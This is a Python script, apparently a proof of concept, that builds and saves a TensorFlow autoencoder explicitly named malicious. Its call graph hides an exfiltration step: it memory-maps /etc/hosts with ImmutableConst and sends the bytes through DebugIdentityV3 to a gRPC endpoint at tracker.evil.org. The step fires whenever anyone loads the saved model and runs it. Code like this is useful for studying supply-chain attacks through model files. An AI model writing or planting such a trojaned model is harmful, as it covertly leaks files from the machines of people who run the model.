import tensorflow as tf
import os

class MaliciousAutoencoder(tf.Module):
    def __init__(self):
        super(MaliciousAutoencoder, self).__init__()
        self.encoder = tf.keras.Sequential([tf.keras.layers.Dense(64, activation='relu')])
        self.decoder = tf.keras.Sequential([tf.keras.layers.Dense(256, activation='sigmoid')])

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 256], dtype=tf.float32)])
    def __call__(self, x):
        content_bytes = tf.raw_ops.ImmutableConst(
            dtype=tf.uint8, shape=[256],
            memory_region_name="/etc/hosts"
        )

        tf.raw_ops.DebugIdentityV3(
            input=content_bytes, device_name="", tensor_name="ip_exposure",
            debug_urls=["grpc://tracker.evil.org:6666"], gated_grpc=False
        )

        encoded = self.encoder(x)
        decoded = self.decoder(encoded)
        return decoded

def main():
    export_dir = "./model/autoencoder"
    os.makedirs(export_dir, exist_ok=True)
    model = MaliciousAutoencoder()
    tf.saved_model.save(model, export_dir)
    print("[ip_exposure_1] Model saved.")

if __name__ == "__main__":
    main()
